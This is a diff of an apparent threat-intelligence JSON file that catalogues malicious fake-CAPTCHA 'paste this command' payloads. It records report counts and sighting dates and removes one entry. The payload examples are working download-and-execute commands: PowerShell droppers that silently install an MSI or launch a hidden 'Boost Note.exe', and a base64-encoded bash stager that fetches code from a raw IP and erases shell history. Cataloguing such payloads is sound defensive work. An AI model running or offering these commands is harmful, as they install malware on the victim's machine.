@@ -941,11 +941,10 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 4,
-    "FirstSeen": "2026-11-14T19:11:36.644000+00:00",
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-15T00:42:40.551000+00:00",
     "LastSeen": "2026-11-17T20:46:15.496000+00:00",
     "ReportIds": [
-      "cmwgs7swd0lxo0oml3ahm9x1b",
       "cmwh41jw00nhv0omlq5rsqtp4",
       "cmwk6ibyh1asd0omlequtdloh",
       "cmwl5x2pj1hne0omlek9idizj"
@@ -974,9 +973,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 12,
+    "ReportCount": 13,
     "FirstSeen": "2026-11-21T01:20:51.962000+00:00",
-    "LastSeen": "2026-11-21T18:15:15.857000+00:00",
+    "LastSeen": "2026-11-21T19:21:46.825000+00:00",
     "ReportIds": [
       "cmwpq1rz623xv0oml9b7ckyzg",
       "cmwpvtv3x24da0omlegqyi3w3",
@@ -989,7 +988,8 @@
       "cmwqaak5m25zo0omla4vviesx",
       "cmwqh59zd26op0omlzr69fgi7",
       "cmwqpzvm527qz0omlbakji56v",
-      "cmwqqaax7281a0omlwpjbmm8f"
+      "cmwqqaax7281a0omlwpjbmm8f",
+      "cmwqsnua328lm0omlqomd3emx"
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
@@ -1211,19 +1211,6 @@
     ],
     "PayloadExamples": [
       "echo 'I am not a robot - reCAPTCHA Verification ID: 208218' && echo 'ZXhwb3J0IFNSQ19VUkw9J2h0dHBzOi8vY2FzYXNhbnZpY2VudGUuY29tLycgJiYgKGNkIC90bXAgJiYgY3VybCAta2ZzU0wgLS11c2VyLWFnZW50ICdHb1BheWxvYWQtQ0ROLzc0YzE0OWYxMTU0NmRkZjI2NGU2YTVmMjFiNjYzMjI0NWMyMzFiN2Y1ODM1M2UwMDA0YjE4YTc3NTlkY2VmYjAnICJodHRwOi8vODMuMTQxLjkwLjE5L2YwZWM4NWVhMWUiIC1vIC5PUldrWFAgJiYgYmFzaCAuT1JXa1hQICYmIHJtIC1mIC5PUldrWFApID4gL2Rldi9udWxsIDI+JjEgJiBjbGVhcjsgcHJpbnRmICdcMDMzWzNKJzsgaGlzdG9yeSAtZCAkKGhpc3RvcnkgMSAyPi9kZXYvbnVsbCB8IGF3ayAne3ByaW50ICQxfScpIDI+L2Rldi9udWxsOyBmYyAtcCAvZGV2L251bGwgMj4vZGV2L251bGw7IHByaW50ZiAnXG4gIFwwMzNbMzJtXHhlMlx4OWNceDkzIFZlcmlmaWNhdGlvbiBzdWNjZXNzZnVsXDAzM1swbVxuXG4n' | base64 -D | bash"
-    ]
-  },
-  {
-    "Pattern": "powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri '<URL>' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri '<URL>' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri '<URL>' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.msi, ' powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri '<URL>' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/q powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri '<URL>' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-14T19:04:54.671000+00:00",
-    "LastSeen": "2026-11-14T19:04:54.671000+00:00",
-    "ReportIds": [
-      "cmwgrz6qp0lwz0omly2u8bt21"
-    ],
-    "PayloadExamples": [
-      "powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.msi, ' powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/q powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc."
     ]
   },
   {
